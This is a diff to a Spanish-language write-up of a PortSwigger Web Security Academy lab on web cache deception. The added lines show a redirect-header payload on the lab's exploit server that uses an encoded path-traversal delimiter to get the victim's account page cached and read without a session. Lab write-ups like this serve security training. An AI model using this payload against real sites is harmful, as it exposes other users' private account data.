@@ -167,6 +167,13 @@ Una vez sabemos esto, vamos a `crear` un `payload` y a `pegarlo` en el `Exploit 
 
 ![](/assets/img/Web-Cache-Deception-Lab-4/image_22.png)
 
+Otra `alternativa` es `inyectar` el `payload` en el `Head` del `Exploit Server`
+
+```
+HTTP/1.1 301 Moved Permanently
+Location: https://0adf002a04881b5f81d73996001d00d3.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?cachebuster=2
+```
+
 Pulsamos sobre `View exploit` y rápidamente `enviamos esta petición sin nuestra cookie sesión`. Como vemos, `podemos ver la información cacheada de nuestro usuario sin estar logueados`
 
 ```
